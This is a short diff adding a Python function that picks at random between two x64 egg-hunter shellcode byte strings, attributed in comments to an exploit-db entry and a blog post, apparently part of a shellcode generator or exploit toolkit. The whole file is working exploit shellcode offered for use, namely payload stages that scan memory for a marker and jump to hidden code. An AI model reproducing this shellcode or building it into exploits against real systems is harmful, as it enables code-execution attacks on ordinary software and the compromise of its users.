@@ -1,0 +1,13 @@
+from random import randint
+
+def egghunter():
+	list = [
+			#https://www.exploit-db.com/exploits/38708/
+			r"\x58\x48\xff\xc0\x81\x78\xfc\x68\x40\x63\x6b\x75\xf4\x81\x78\xf8\x68\x40\x63\x6b\x75\xeb\xff\xd0",
+
+			#http://zerosum0x0.blogspot.com.tr/2014/12/x64-egg-hunter-shellcode.html
+			r"\x54\x59\x48\x83\xc1\xff\x48\xff\xc1\x81\x79\xfc\x7a\x30\x78\x30\x75\xf4\xff\xe1",
+
+			]
+	return list[randint(0, len(list)-1)]
+
